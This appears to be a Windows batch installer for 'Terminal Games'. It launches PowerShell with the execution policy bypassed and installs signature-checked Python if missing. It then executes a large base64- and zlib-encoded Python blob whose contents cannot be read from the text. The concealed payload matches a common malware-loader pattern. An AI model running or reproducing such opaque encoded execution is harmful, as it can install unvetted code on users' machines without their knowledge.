@echo off
setlocal
title Terminal Games Installer
set "TG_INSTALLER_SELF=%~f0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$text=[IO.File]::ReadAllText($env:TG_INSTALLER_SELF); $body=($text -split '(?m)^::TG_POWERSHELL_START\r?$',2)[1]; & ([scriptblock]::Create($body))"
if "%errorlevel%"=="76" exit
if errorlevel 1 pause
exit /b
::TG_POWERSHELL_START
$ErrorActionPreference = 'Stop'
function Find-Python {
    $candidates = @()
    $py = Get-Command py.exe -ErrorAction SilentlyContinue
    if ($py) {
        try {
        $found = & $py.Source -3 -c "import sys; assert sys.version_info >= (3,9); print(sys.executable)" 2>$null
        if ($LASTEXITCODE -eq 0 -and $found) { return [string]($found | Select-Object -Last 1) }
        } catch {}
    }
    $candidates += Join-Path $env:LOCALAPPDATA 'Programs\Python\Python313\python.exe'
    $command = Get-Command python.exe -ErrorAction SilentlyContinue
    if ($command -and $command.Source -notlike '*\WindowsApps\*') { $candidates += $command.Source }
    foreach ($candidate in $candidates) {
        if (Test-Path $candidate) {
            & $candidate -c "import sys; assert sys.version_info >= (3,9)" 2>$null
            if ($LASTEXITCODE -eq 0) { return $candidate }
        }
    }
    return $null
}
try {
    $python = Find-Python
    if (-not $python) {
        Write-Host 'Python is missing. Downloading the official installer...'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $architecture = $env:PROCESSOR_ARCHITECTURE
        if ($env:PROCESSOR_ARCHITEW6432) { $architecture = $env:PROCESSOR_ARCHITEW6432 }
        $suffix = switch ($architecture) { 'ARM64' {'-arm64'} 'AMD64' {'-amd64'} default {''} }
        $temporary = Join-Path ([IO.Path]::GetTempPath()) ('terminal-games-' + [guid]::NewGuid())
        New-Item -ItemType Directory -Path $temporary | Out-Null
        try {
            $installer = Join-Path $temporary 'python-installer.exe'
            Invoke-WebRequest -UseBasicParsing -Uri "https://www.python.org/ftp/python/3.13.17/python-3.13.17$suffix.exe" -OutFile $installer
            $signature = Get-AuthenticodeSignature $installer
            if ($signature.Status -ne 'Valid' -or $signature.SignerCertificate.Subject -notmatch 'Python Software Foundation') { throw 'Python installer signature check failed.' }
            Write-Host 'Installing Python for your Windows account...'
            $process = Start-Process -FilePath $installer -ArgumentList '/passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0' -Wait -PassThru
            if ($process.ExitCode -notin @(0,3010)) { throw "Python installation failed (code $($process.ExitCode))." }
        } finally { Remove-Item -LiteralPath $temporary -Recurse -Force -ErrorAction SilentlyContinue }
        $python = Find-Python
        if (-not $python) { throw 'Python could not be found after installation. Restart Windows and try START HERE again.' }
    }
    & $python -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('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')),'<Terminal Games installer>','exec'))"
    exit $LASTEXITCODE
} catch {
    Write-Host ('Installation failed: ' + $_.Exception.Message) -ForegroundColor Red
    exit 1
}
